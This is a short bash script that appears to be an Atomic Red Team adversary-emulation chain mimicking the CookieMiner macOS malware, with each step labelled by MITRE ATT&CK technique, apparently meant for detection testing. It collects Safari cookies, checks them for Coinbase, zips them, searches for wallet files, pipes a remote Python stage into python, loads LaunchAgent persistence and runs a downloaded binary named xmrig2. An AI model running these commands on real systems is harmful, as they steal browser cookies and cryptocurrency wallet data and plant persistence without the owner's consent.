#! /bin/bash

#   Tactic: Discovery
#   Technique: T1033 - System Owner/User Discovery
OUTPUT="$(id -un)"

#   Tactic: Collection
#   Technique: T1005 - Data from Local System
cd ~/Library/Cookies
grep -q "coinbase" "Cookies.binarycookies"

#   Tactic: Collection
#   Technique: T1074 - Data Staged
mkdir ${OUTPUT}
cp Cookies.binarycookies ${OUTPUT}/Cookies.binarycookies

#   Tactic: Exfiltration
#   Technique: T1002 - Data Compressed
zip -r interestingsafaricookies.zip ${OUTPUT}

#   Tactic: Exfiltration
#   Technique: T1048 - Exfiltration Over Alternative Protocol
#   Simulate network connection for exfiltration
curl https://atomicredteam.io > /dev/null

curl --silent https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/cookie-miner-stage-02.py || wget -q -O- https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/cookie-miner-stage-02.py | python - ``

#   Tactic: Discovery
#   Technique: T1083 - File and Directory Discovery
find ~ -name "*wallet*" > interestingfiles.txt
cp interestingfiles.txt ${OUTPUT}/interestingfiles.txt

#   Tactic: Persistence
#   Technique: T1159 - Launch Agent
mkdir -p ~/Library/LaunchAgents
cd ~/Library/LaunchAgents
curl --silent -o com.apple.rig2.plist https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/cookie-miner-payload-launchagent.plist
curl --silent -o com.proxy.initialize.plist https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/cookie-miner-backdoor-launchagent.plist
launchctl load -w com.apple.rig2.plist
launchctl load -w com.proxy.initialize.plist


cd /Users/Shared
curl --silent -o xmrig2 https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/atomic-hello.macos

#   Tactic: Defense Evasion
#   Technique: T1222 - File Permissions Modification
chmod +x ./xmrig2
./xmrig2